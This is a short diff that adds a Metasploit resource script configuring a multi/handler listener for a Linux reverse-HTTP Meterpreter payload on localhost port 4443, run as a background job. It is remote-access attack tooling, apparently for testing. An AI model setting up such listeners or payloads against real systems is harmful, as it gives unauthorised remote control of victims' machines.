@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set ExitOnSession false
+set payload linux/x64/meterpreter_reverse_http
+set lhost 127.0.0.1
+set lport 4443
+exploit -j
